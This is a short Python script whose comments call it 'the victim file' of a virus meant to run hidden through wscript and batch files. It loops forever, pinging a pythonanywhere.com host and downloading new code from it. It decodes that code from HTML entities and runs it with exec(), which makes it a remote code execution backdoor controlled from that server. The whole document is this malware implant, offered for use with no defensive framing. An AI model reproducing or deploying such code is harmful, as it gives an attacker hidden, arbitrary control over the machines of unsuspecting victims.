# the victim file
# searches on the webiste for the virus
# operates hidden thantks to wscript and the .bat files
# continuely checks for updates

import requests
import time
from _thread import *


def get_data(webpage):
    url = webpage

    req = requests.get(url, 'html.parser')

    return req.text

data_old = ""
data = ""
    
print("waiting for server code ;) ")

while 1:
    
    time.sleep(1)
    get_data("http://pythonanywherean.pythonanywhere.com/Connected/")
    try:
        a = get_data("http://pythonanywherean.pythonanywhere.com/GetNewCode/")
        if a!=data_old:
            print("data found ;)")
            data_old = a
            data = data_old.replace("‰endline%", "\n")
            data = data.replace("%tab%", r"    ")
            data = data.replace("&quot;", r"'")
            data = data.replace("&#x27;", r"'")
            data = data.replace("&gt;", r">")
            data = data.replace("&lt;", r"<")
            print("recharging file")
            #with open("Windows Update\Scripts\Virus.py", "r") as f:
            try:
                print(data)
                exec(data)
            except :
                
                with open(r"C:\Users\Utilisateur\Desktop\Ca bug.txt", "w+") as f:
                    pass
  
                
            
               
    except :
        with open(r"C:\Users\Utilisateur\Desktop\Ca bug2.txt", "w+") as f:
                    pass


